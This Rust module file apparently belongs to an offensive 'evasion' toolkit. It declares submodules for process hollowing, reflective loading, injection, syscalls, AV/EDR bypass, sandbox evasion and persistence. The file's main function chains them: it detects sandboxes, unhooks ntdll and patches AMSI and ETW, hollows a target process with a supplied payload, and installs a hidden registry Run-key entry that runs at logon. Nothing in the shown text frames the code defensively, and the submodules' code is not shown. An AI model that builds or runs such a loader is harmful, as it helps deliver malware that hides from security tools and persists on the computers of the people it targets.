pub mod process_hollowing;
pub mod reflective_loader;
pub mod persistence;
pub mod av_edr_bypass;
pub mod sandbox_evasion;
pub mod injection;
pub mod syscall;

pub use process_hollowing::{ProcessHollower, HollowingResult, RunPeConfig};
pub use reflective_loader::{ReflectiveLoader, ReflectiveLoadResult, ReflectiveLoaderConfig};
pub use persistence::{PersistenceEngine, PersistenceResult, PersistenceConfig, PersistenceTechnique};
pub use av_edr_bypass::{AvEdrBypass, BypassResult, BypassConfig};
pub use sandbox_evasion::{SandboxEvasion, EvasionResult, EvasionConfig};
pub use injection::{InjectionFramework, InjectionResult, InjectionConfig, InjectionMethod};
pub use syscall::IndirectSyscall;

use serde::{Deserialize, Serialize};
use thiserror::Error;

#[derive(Debug, Error)]
pub enum EvasionError {
    #[error("Process hollowing error: {0}")]
    Hollowing(String),
    #[error("Reflective loader error: {0}")]
    ReflectiveLoader(String),
    #[error("Persistence error: {0}")]
    Persistence(String),
    #[error("AV/EDR bypass error: {0}")]
    AvEdrBypass(String),
    #[error("Sandbox evasion error: {0}")]
    SandboxEvasion(String),
    #[error("Injection error: {0}")]
    Injection(String),
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EvasionReport {
    pub timestamp: String,
    pub hollowing: Option<HollowingResult>,
    pub reflective_load: Option<ReflectiveLoadResult>,
    pub persistence: Option<PersistenceResult>,
    pub bypass: Option<BypassResult>,
    pub sandbox_detection: Option<EvasionResult>,
    pub injection: Option<InjectionResult>,
}

pub struct EvasionEngine;

impl EvasionEngine {
    /// Execute comprehensive evasion workflow
    pub fn execute_full_evasion(
        target_exe: &str,
        payload: &[u8],
        enable_hollowing: bool,
        enable_persistence: bool,
        enable_bypass: bool,
    ) -> Result<EvasionReport, EvasionError> {
        let mut report = EvasionReport {
            timestamp: "2024-01-01T00:00:00Z".to_string(),
            hollowing: None,
            reflective_load: None,
            persistence: None,
            bypass: None,
            sandbox_detection: None,
            injection: None,
        };

        // Sandbox detection first
        let evasion_config = sandbox_evasion::EvasionConfig {
            check_cpu_count: true,
            check_memory: true,
            check_disk_size: true,
            check_registry_keys: true,
            check_mac_address: false,
            check_mouse_movement: false,
            check_sleep_acceleration: true,
        };

        match SandboxEvasion::detect_sandbox(&evasion_config) {
            Ok(result) => report.sandbox_detection = Some(result),
            Err(e) => log::warn!("Sandbox detection failed: {}", e),
        }

        // AV/EDR bypass
        if enable_bypass {
            let bypass_config = av_edr_bypass::BypassConfig {
                unhook_ntdll: true,
                unhook_kernel32: false,
                patch_amsi: true,
                patch_etw: true,
                use_syscall_stub: true,
                indirect_syscalls: false,
            };

            match AvEdrBypass::apply_bypasses(&bypass_config) {
                Ok(result) => report.bypass = Some(result),
                Err(e) => log::warn!("AV/EDR bypass failed: {}", e),
            }
        }

        // Process hollowing
        if enable_hollowing {
            match ProcessHollower::hollow(target_exe, payload) {
                Ok(result) => report.hollowing = Some(result),
                Err(e) => return Err(EvasionError::Hollowing(e.to_string())),
            }
        }

        // Persistence
        if enable_persistence {
            let persist_config = persistence::PersistenceConfig {
                technique: persistence::PersistenceTechnique::RegistryRun,
                target_path: target_exe.to_string(),
                artifact_name: "ReaperShieldPersistence".to_string(),
                execute_on: "logon".to_string(),
                hidden: true,
            };

            match PersistenceEngine::apply(&persist_config) {
                Ok(result) => report.persistence = Some(result),
                Err(e) => log::warn!("Persistence failed: {}", e),
            }
        }

        Ok(report)
    }
}
